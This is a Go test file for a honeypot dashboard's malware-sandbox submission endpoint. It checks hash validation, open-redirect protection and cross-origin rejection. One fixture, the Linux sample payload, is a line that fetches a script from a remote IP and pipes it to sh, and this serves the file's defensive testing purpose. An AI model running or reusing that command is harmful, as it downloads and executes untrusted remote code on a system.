package main

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// linuxSample is classified as a POSIX shell script: Linux platform, dynamic,
// so it exercises the pre-existing spool. Bodies matter now that submission
// routes on content.
const linuxSample = "#!/bin/sh\ncurl http://198.51.100.7/x | sh\n"

// windowsSample is the smallest byte sequence classifyPayload calls a Windows
// PE. pe.NewFile rejects it, which is the DOS-stub-only fallback branch, and
// that branch is still Windows and still dynamic.
const windowsSample = "MZ\x90\x00this is not a parseable PE, only a DOS stub"

func TestSandboxSubmitWritesOnlyValidatedExistingHash(t *testing.T) {
	payloads, requests := t.TempDir(), t.TempDir()
	hash := strings.Repeat("a", 64)
	if err := os.WriteFile(filepath.Join(payloads, hash), []byte(linuxSample), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
	configureIdentityTestBackend(t, "admin")
	t.Setenv("SANDBOX_REQUEST_DIR", requests)
	s := &store{payloadDirs: []string{payloads}}
	r := httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader("hash="+hash))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	addIdentityTestCookie(r)
	r.Header.Set("Origin", "https://honeypot.example")
	w := httptest.NewRecorder()
	s.serveSandboxSubmit(w, r)
	if w.Code != http.StatusSeeOther {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}
	if _, err := os.Stat(filepath.Join(requests, hash+".request")); err != nil {
		t.Fatalf("request missing: %v", err)
	}
}

func TestSandboxSubmitReturnsToTheInitiatingRun(t *testing.T) {
	payloads, requests := t.TempDir(), t.TempDir()
	hash := strings.Repeat("c", 64)
	if err := os.WriteFile(filepath.Join(payloads, hash), []byte(linuxSample), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
	configureIdentityTestBackend(t, "admin")
	t.Setenv("SANDBOX_REQUEST_DIR", requests)
	s := &store{payloadDirs: []string{payloads}}
	body := "hash=" + hash + "&return=" + url.QueryEscape("/sandbox/job-2026-07-30")
	r := httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader(body))
	r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	addIdentityTestCookie(r)
	r.Header.Set("Origin", "https://honeypot.example")
	w := httptest.NewRecorder()
	s.serveSandboxSubmit(w, r)
	if w.Code != http.StatusSeeOther {
		t.Fatalf("status=%d body=%s", w.Code, w.Body.String())
	}
	location := w.Header().Get("Location")
	if !strings.HasPrefix(location, "/sandbox/job-2026-07-30?") || !strings.Contains(location, "analysis=queued") {
		t.Fatalf("location=%q, want the initiating run with the queued marker", location)
	}
}

// An operator-supplied return target must never become an open redirect or a
// route outside the sandbox/payload surfaces.
func TestSubmitReturnURLRejectsForeignTargets(t *testing.T) {
	hash := strings.Repeat("d", 64)
	fallback := "/payloads?analysis=queued&hash=" + hash + "&target=windows"
	for _, raw := range []string{
		"", "   ",
		"https://evil.example/sandbox/x",
		"//evil.example/sandbox/x",
		"/settings",
		"/events?ip=1.2.3.4",
		"http://honeypot.example/payloads",
	} {
		if got := submitReturnURL(raw, hash, targetWindows); got != fallback {
			t.Fatalf("submitReturnURL(%q) = %q, want the payload inventory fallback", raw, got)
		}
	}
	got := submitReturnURL("/payload-analysis/"+hash+"#top", hash, targetLinux)
	if strings.Contains(got, "#") || !strings.HasPrefix(got, "/payload-analysis/"+hash+"?") {
		t.Fatalf("submitReturnURL kept an unexpected shape: %q", got)
	}
	if !strings.Contains(got, "target=linux") {
		t.Fatalf("submitReturnURL dropped the chosen backend: %q", got)
	}
}

func TestSandboxSubmitRejectsCrossSiteAndUnknownPayload(t *testing.T) {
	t.Setenv("DASHBOARD_REQUIRE_ADMIN", "true")
	configureIdentityTestBackend(t, "admin")
	t.Setenv("SANDBOX_REQUEST_DIR", t.TempDir())
	hash := strings.Repeat("b", 64)
	s := &store{payloadDirs: []string{t.TempDir()}}
	for _, origin := range []string{"https://evil.example", "https://honeypot.example"} {
		r := httptest.NewRequest(http.MethodPost, "https://honeypot.example/sandbox/submit", strings.NewReader("hash="+hash))
		r.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		addIdentityTestCookie(r)
		r.Header.Set("Origin", origin)
		w := httptest.NewRecorder()
		s.serveSandboxSubmit(w, r)
		want := http.StatusForbidden
		if origin == "https://honeypot.example" {
			want = http.StatusNotFound
		}
		if w.Code != want {
			t.Fatalf("origin=%s status=%d want=%d", origin, w.Code, want)
		}
	}
}
